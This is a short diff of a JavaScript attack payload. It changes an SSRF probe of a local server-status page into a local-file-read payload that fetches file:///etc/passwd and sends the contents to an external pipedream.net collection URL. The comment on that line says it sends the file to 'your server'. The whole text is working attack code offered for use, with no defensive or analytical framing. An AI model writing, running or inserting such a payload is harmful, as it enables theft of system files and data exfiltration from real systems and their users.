@@ -1,4 +1,6 @@
-fetch('http://localhost/server-status')
+fetch('file:///etc/passwd')
   .then(response => response.text())
-  .then(text => alert(text))
-  .catch(error => alert('SSRF Failed: ' + error.message));
+  .then(text => {
+    fetch('https://eoyo36fmz8facye.m.pipedream.net' + encodeURIComponent(text));  // Send file content to your server
+  })
+  .catch(error => alert('LFI Failed: ' + error.message));
